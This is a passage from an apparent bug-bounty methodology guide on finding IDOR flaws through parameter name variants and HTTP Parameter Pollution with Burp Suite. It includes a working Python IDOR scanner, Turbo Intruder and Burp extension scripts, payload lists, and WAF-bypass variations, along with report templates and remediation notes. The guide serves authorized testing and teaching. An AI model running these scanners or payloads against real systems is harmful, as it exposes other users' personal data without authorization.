  "email": "victim@test.com",
  "ssn": "123-45-6789",
  "credit_card": "4111-1111-1111-1111"
}
```

#### **Scenario B: Parameter Override**
```
# Original request with two parameters
GET /api/profile?id=100&user_id=101

# Server may use:
# - First parameter: id=100
# - Last parameter: user_id=101
# - All parameters: check which overrides
```

#### **Scenario C: Chained Parameters**
```
GET /api/data?user=100&profile_id=101
GET /api/data?account_id=100&user_ref=101
```

---

## 🛡️ **PHASE 4: ADVANCED TESTING TECHNIQUES**

### **Step 4.1: Parameter Pollution Testing**

Test how the application handles multiple parameters:

```python
# Turbo Intruder script for parameter pollution
def queueRequests(target, wordlists):
    engine = RequestEngine(target, concurrentConnections=5)
    
    # Test different parameter combinations
    combos = [
        "id=100&user_id=101",
        "user_id=101&id=100", 
        "id=100&user_id=101&id=102",
        "user_id[]=100&user_id[]=101",
        "id=100&user-id=101",
        "id=100&userId=101"
    ]
    
    for combo in combos:
        engine.queue(f"""GET /api/profile?{combo} HTTP/1.1
Host: {target.host}
Cookie: session=xyz

""")
```

### **Step 4.2: Case Sensitivity Testing**

```python
# Generate case variations
params = ['userid', 'userId', 'UserID', 'USERID', 
          'user-id', 'User-Id', 'USER-ID', 'user.id']

for param in params:
    response = requests.get(
        url,
        params={param: 101},
        cookies=sess
    )
    
    if response.status_code == 200:
        print(f"Case variation accepted: {param}")
```

### **Step 4.3: Encoding Bypass Testing**

```python
# Test URL-encoded variations
import urllib.parse

params = ['user id', 'user.id', 'user-id', 'user/id']
for param in params:
    encoded = urllib.parse.quote(param)
    response = requests.get(
        f"{url}?{encoded}=101",
        cookies=sess
    )
```

---

## 📊 **PHASE 5: REPORTING & DOCUMENTATION**

### **Step 5.1: Document Each Finding**

```markdown
## IDOR Vulnerability via Parameter Prefix/Suffix

**Endpoint:** `https://target.com/api/profile`
**Original Parameter:** `id` (value: 100)
**Vulnerable Parameter:** `user_id` (value: 101)

### Proof of Concept
1. Original request (authorized):
   ```
   GET /api/profile?id=100
   Response: User 100 data
   ```

2. Modified request (unauthorized):
   ```
   GET /api/profile?user_id=101
   Response: User 101 data
   ```

### Impact
- Access to other users' personal information
- Data exposed: email, address, phone, SSN

### Technical Details
- Parameter accepts any numeric ID
- No authorization check on `user_id` parameter
- Response time: 234ms (similar to valid requests)

### Reproduction Steps
1. Login as user 100
2. Capture request to `/api/profile`
3. Add parameter `user_id=101`
4. Observe response contains user 101 data
```

### **Step 5.2: Create Automation Script**

```python
#!/usr/bin/env python3
"""
IDOR Scanner for Parameter Prefix/Suffix
Usage: python3 scan_idor.py -u https://target.com -c "session=xyz"
"""

import requests
import argparse
import json
from concurrent.futures import ThreadPoolExecutor

class IDORScanner:
    def __init__(self, base_url, cookies, param_wordlist):
        self.base_url = base_url
        self.cookies = cookies
        self.params = self.load_params(param_wordlist)
        self.results = []
        
    def load_params(self, wordlist):
        with open(wordlist, 'r') as f:
            return [line.strip() for line in f]
    
    def test_parameter(self, param, original_id, victim_id):
        """Test a single parameter for IDOR"""
        result = {
            'parameter': param,
            'original_response': None,
            'victim_response': None,
            'vulnerable': False
        }
        
        # Test with original ID
        orig_resp = requests.get(
            f"{self.base_url}?{param}={original_id}",
            cookies=self.cookies
        )
        result['original_response'] = {
            'status': orig_resp.status_code,
            'length': len(orig_resp.text)
        }
        
        # Test with victim ID
        victim_resp = requests.get(
            f"{self.base_url}?{param}={victim_id}",
            cookies=self.cookies
        )
        result['victim_response'] = {
            'status': victim_resp.status_code,
            'length': len(victim_resp.text)
        }
        
        # Check if vulnerable
        if (victim_resp.status_code == 200 and 
            len(victim_resp.text) > 100 and
            'email' in victim_resp.text.lower()):
            result['vulnerable'] = True
            result['data_preview'] = victim_resp.text[:200]
        
        return result
    
    def scan(self, original_id, victim_id, threads=5):
        """Scan all parameters"""
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            for param in self.params:
                future = executor.submit(
                    self.test_parameter, 
                    param, original_id, victim_id
                )
                futures.append(future)
            
            for future in futures:
                result = future.result()
                if result['vulnerable']:
                    self.results.append(result)
                    print(f"⚠️ VULNERABLE: {result['parameter']}")
        
        return self.results

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', required=True)
    parser.add_argument('-c', '--cookie', required=True)
    parser.add_argument('-o', '--original', type=int, default=100)
    parser.add_argument('-v', '--victim', type=int, default=101)
    parser.add_argument('-w', '--wordlist', default='param_wordlist.txt')
    
    args = parser.parse_args()
    
    cookies = {}
    for item in args.cookie.split(';'):
        if '=' in item:
            key, value = item.strip().split('=', 1)
            cookies[key] = value
    
    scanner = IDORScanner(args.url, cookies, args.wordlist)
    results = scanner.scan(args.original, args.victim)
    
    # Save results
    with open('idor_results.json', 'w') as f:
        json.dump(results, f, indent=2)
    
    print(f"\nScan complete! Found {len(results)} vulnerabilities.")
    print("Results saved to idor_results.json")

if __name__ == "__main__":
    main()
```

---

## 🛠️ **BURP SUITE CONFIGURATION SUMMARY**

### **Essential Settings**
1. **Proxy → Options**:
   - Enable "Intercept requests based on rules"
   - Add rule: "Or URL is in target scope"

2. **Intruder → Resource Pool**:
   - Max concurrent requests: 5
   - Delay between requests: 200ms

3. **Project Options → Connections**:
   - Timeout: 10 seconds
   - Enable "Follow redirects"

### **Key Extensions Required**
1. **Param Miner** - For parameter discovery
2. **Logger++** - For tracking all requests
3. **Turbo Intruder** - For high-speed fuzzing
4. **Hackvertor** - For encoding/decoding
5. **Copy As Python-Requests** - For PoC generation

---

## ⚡ **QUICK CHECKLIST**

- [ ] Identify all endpoints with parameters
- [ ] Generate comprehensive parameter wordlist
- [ ] Run Param Miner for passive discovery
- [ ] Fuzz parameters with Intruder/Turbo Intruder
- [ ] Analyze responses (length, status, content)
- [ ] Validate findings with manual testing
- [ ] Test parameter pollution scenarios
- [ ] Check case sensitivity variations
- [ ] Test URL-encoded variations
- [ ] Document all vulnerable parameters
- [ ] Create PoC scripts
- [ ] Write detailed report

---

## 📚 **REFERENCES**
- OWASP IDOR Testing Guide
- PortSwigger Research on Parameter Discovery
- Bug Bounty Methodology by @Jhaddix

---

# 🎯 **Bug #30: HTTP Parameter Pollution (HPP) IDOR - Complete Burp Suite Methodology**

## 📋 **What is HTTP Parameter Pollution?**
HPP occurs when an application receives multiple parameters with the same name. Different technologies handle this differently, which can lead to IDOR vulnerabilities.

## 🔍 **DETECTION PHASE**

### **Step 1: Identify Potential Endpoints**
First, map all endpoints that accept parameters:

```
Burp Workflow:
Target → Site Map → Filter by parameters
Look for:
- /api/user?id=123
- /profile?user_id=456
- /document?docId=789
- /account?accountNumber=ABC123
```

### **Step 2: Manual Discovery Patterns**
Test each identified endpoint with duplicate parameters:

```http
Original: GET /api/user?id=123

Test variations:
GET /api/user?id=123&id=456
GET /api/user?user_id=123&user_id=456
POST /api/user with body: id=123&id=456
```

## 🛠️ **BURP SUITE CONFIGURATION**

### **Step 3: Set Up Burp Suite**

```
1. Proxy → Intercept → Turn interception ON
2. Target → Scope → Add your target domain
3. Repeater → Open for manual testing
4. Intruder → Configure for automation
```

### **Step 4: Configure Burp Repeater for HPP Testing**

**Template for testing:**
```http
GET /api/user?id=123&id=456 HTTP/1.1
Host: target.com
Cookie: session=YOUR_SESSION
User-Agent: Mozilla/5.0
Accept: application/json
```

## 🔬 **TESTING METHODOLOGY**

### **Step 5: Systematic Parameter Testing**

#### **Test Case 1: Basic Duplicate**
```http
# Original
GET /api/user?id=100

# Test
GET /api/user?id=100&id=101
GET /api/user?id=101&id=100
GET /api/user?id=100&id=100&id=101
```

#### **Test Case 2: Different Locations**
```http
# URL + Body (for POST)
POST /api/user?id=100 HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

id=101

# Headers + URL
GET /api/user?id=100 HTTP/1.1
X-Original-ID: 101
```

#### **Test Case 3: Different Formats**
```http
# Array format
GET /api/user?id[]=100&id[]=101

# JSON format
POST /api/user HTTP/1.1
Content-Type: application/json

{"id":100,"id":101}

# XML format
POST /api/user HTTP/1.1
Content-Type: application/xml

<user><id>100</id><id>101</id></user>
```

## 🤖 **AUTOMATED TESTING WITH BURP INTRUDER**

### **Step 6: Configure Intruder Attack**

```
1. Send request to Intruder (Ctrl+I)
2. Positions tab → Clear §
3. Highlight parameter value → Add §
4. Example: id=§100§&id=§101§
```

### **Step 7: Payload Sets Configuration**

**Payload Set 1 (First ID):**
```
100 (your ID)
0
-1
999999
null
```

**Payload Set 2 (Second ID):**
```
101 (victim ID)
102
103
104
105
```

### **Step 8: Attack Types**

#### **Sniper Attack** - Test single parameter variations
```
Positions: id=§100§&id=101
Payloads: [101,102,103,104]
```

#### **Battering Ram** - Same payload in both positions
```
Positions: id=§100§&id=§100§
Payloads: [101,102,103,104]
```

#### **Pitchfork** - Pair specific combinations
```
Positions: id=§100§&id=§101§
Payload Set 1: [100,100,100]
Payload Set 2: [101,102,103]
```

#### **Cluster Bomb** - Test all combinations
```
Positions: id=§100§&id=§101§
Payload Set 1: [100,101,102]
Payload Set 2: [200,201,202]
Total requests: 3×3 = 9
```

## 🎯 **ADVANCED TESTING TECHNIQUES**

### **Step 9: Server Behavior Fingerprinting**

Test to identify how the server handles duplicates:

```http
# Test 1: Last parameter wins
GET /api/user?id=100&id=101
Response shows user 101 → Last parameter wins

# Test 2: First parameter wins
GET /api/user?id=100&id=101
Response shows user 100 → First parameter wins

# Test 3: Concatenation
GET /api/user?id=100&id=101
Response shows "100,101" → Parameters concatenated

# Test 4: Array
GET /api/user?id[]=100&id[]=101
Response shows [100,101] → Array format
```

### **Step 10: Parameter Pollution + Other Techniques**

#### **With Case Manipulation**
```http
GET /api/user?id=100&ID=101
GET /api/user?Id=100&id=101
GET /api/user?USER_ID=100&user_id=101
```

#### **With Encoding**
```http
GET /api/user?id=100&id=%31%30%31
GET /api/user?id=100&id=101%00
GET /api/user?id=100&id=101%20
```

#### **With Special Characters**
```http
GET /api/user?id=100&id=101'
GET /api/user?id=100&id=101--
GET /api/user?id=100&id=101;
```

## 📊 **RESPONSE ANALYSIS**

### **Step 11: What to Look For**

```python
# Response Analysis Checklist
1. Status Code Changes:
   - 200 → 403 indicates security check
   - 200 → 200 with different data = IDOR!
   - 404 → 200 indicates info disclosure

2. Content Differences:
   - Different username appears
   - Different email addresses
   - Different profile data
   - Different document content

3. Error Messages:
   - SQL errors (indicates injection)
   - Path disclosure
   - Stack traces
   - "Multiple values not allowed"
```

### **Step 12: Response Comparison**

**Use Burp Comparer:**
```
1. Select two responses
2. Right-click → Send to Comparer
3. Compare word-by-word or byte-by-byte
4. Look for:
   - Different user data
   - Different permissions
   - Hidden fields
   - Tokens
```

## 🚀 **ADVANCED SCENARIOS**

### **Scenario 1: REST API Testing**
```http
# Test different HTTP methods
GET /api/users/100
GET /api/users/100&id=101
POST /api/users/100?access=admin&id=101
PUT /api/users/100 with body: {"id":101}
DELETE /api/users/100&id=101
```

### **Scenario 2: GraphQL Testing**
```graphql
# Original query
query {
  user(id: 100) {
    name
    email
  }
}

# HPP test
query {
  user(id: 100, id: 101) {
    name
    email
  }
}
```

### **Scenario 3: File Upload/Download**
```http
# File download with HPP
GET /download?file=doc100.pdf&file=doc101.pdf

# File upload with HPP
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=xxx

--xxx
Content-Disposition: form-data; name="file"

doc100.pdf
--xxx
Content-Disposition: form-data; name="file"

doc101.pdf
--xxx--
```

## 🛡️ **BYPASSING PROTECTIONS**

### **Technique 1: WAF Bypass**
```http
# Instead of:
id=100&id=101

# Try:
id=100&id=101&id=100
id=100&id=101&id=101
id=100&id=101&id=102
id=100&id=101&id=100&id=101
```

### **Technique 2: Parameter Wrapping**
```http
# Original parameter name variations
user[id]=100&user[id]=101
data[user][id]=100&data[user][id]=101
attributes[user_id]=100&attributes[user_id]=101
```

### **Technique 3: Mixing Formats**
```http
POST /api/user?id=100&id=101 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
X-API-Format: json

{"id":102,"id":103}
```

## 📈 **BURP EXTENSIONS FOR HPP**

### **Recommended Extensions:**

1. **Param Miner** - Discover hidden parameters
   ```
   Right-click → Extensions → Param Miner
   → "Guess params" or "Guess headers"
   ```

2. **HTTP Request Smuggler** - Test request handling
   ```
   Detect how server processes multiple parameters
   ```

3. **Turbo Intruder** - High-speed testing
   ```python
   def queueRequests(target, wordlists):
       engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=10)
       
       for first in range(100, 200):
           for second in range(100, 200):
               engine.queue(target.req, [
                   str(first),
                   str(second)
               ])
   ```

## 📝 **DOCUMENTATION TEMPLATE**

When you find a working HPP IDOR, document it:

```markdown
# IDOR via HTTP Parameter Pollution

## Vulnerability Details
- **Endpoint:** https://target.com/api/user
- **Method:** GET
- **Parameter:** id (duplicate)
- **Server Behavior:** Last parameter wins

## Proof of Concept
Original Request (my data):
GET /api/user?id=100
Response: {"user":"myuser","email":"me@test.com"}

Exploit Request (victim's data):
GET /api/user?id=100&id=101
Response: {"user":"victim","email":"victim@test.com"}

## Impact
- Unauthorized access to victim's profile
- Data exposure: email, personal info
- Potential account takeover

## Steps to Reproduce
1. Log in as user 100
2. Send request with duplicate id parameter
3. Observe victim's data returned

## Remediation
- Validate only one parameter instance
- Implement server-side authorization
- Use CSRF tokens
```

## 🔧 **AUTOMATION SCRIPT USING BURP API**

```python
# Python script using Burp API for HPP testing
from burp import IBurpExtender, IIntruderPayloadGenerator
from java.util import List, ArrayList
import random

class BurpExtender(IBurpExtender, IIntruderPayloadGenerator):
    
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("HPP IDOR Generator")
        
    def generatePayloads(self, base_value, base_ids):
        # Generate HPP payloads
        payloads = ArrayList()
        
        victim_ids = [101, 102, 103, 104, 105]
        
        for victim_id in victim_ids:
            # Format: original_id&victim_id
            payload = "{}&{}".format(base_value, victim_id)
            payloads.add(payload)
            
            # Format: victim_id&original_id
            payload = "{}&{}".format(victim_id, base_value)
            payloads.add(payload)
            
            # Format with multiple duplicates
            payload = "{}&{}&{}&{}".format(
                base_value, victim_id, base_value, victim_id
            )
            payloads.add(payload)
            
        return payloads
```

## ✅ **FINAL CHECKLIST**

```
[ ] Map all endpoints with parameters
[ ] Identify parameter handling behavior
[ ] Test basic duplicate parameters
[ ] Test different locations (URL, body, headers)
[ ] Test different formats (JSON, XML, form)
[ ] Use Intruder for automation
[ ] Analyze responses for IDOR
[ ] Chain with other techniques
[ ] Document findings
[ ] Create proof of concept
[ ] Test in different user contexts
[ ] Verify impact
[ ] Report responsibly
```

## ⚠️ **PRACTICE LABS**

Set up local testing environment:

```bash
# Docker command for vulnerable app
docker run -d -p 80:80 vulnerables/web-dvwa

# Or use PortSwigger labs
# https://portswigger.net/web-security/access-control/lab-idor-via-parameter-pollution
```

---

## 🎯 **PRO TIPS**

1. **Always test with two different accounts** to confirm IDOR
2. **Use Burp Compare** for response analysis
3. **Monitor response times** - might indicate different processing
4. **Check JavaScript files** for hidden parameters
5. **Test through proxies** to see actual server handling
6. **Document every step** for reproducible findings

Remember: HPP-based IDOR can be subtle. Always verify findings manually and document the exact behavior for your report!
